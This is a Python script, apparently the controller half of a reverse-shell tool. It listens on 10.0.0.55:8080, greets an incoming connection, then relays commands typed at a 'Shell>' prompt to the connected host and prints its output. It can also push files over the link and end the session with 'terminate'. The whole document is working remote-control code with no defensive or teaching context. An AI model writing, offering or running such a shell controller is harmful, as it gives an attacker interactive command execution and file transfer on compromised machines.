import socket
import os



def download(conn, command):
    download, path = command.split("*")
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            conn.send(packet)
            packet = f.read(1024)
    
    else:
        print("File not found")



def connect():

    s = socket.socket()
    s.bind(("10.0.0.55", 8080))
    s.listen(1) 
    conn, addr = s.accept()




    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command: 
            conn.send('terminate'.encode())
            conn.close()
            break


        elif 'download' in command:
            download(conn, command)

        else:
            conn.send(command.encode()) 
            print( conn.recv(1024).decode())

def main():
    connect()
main()

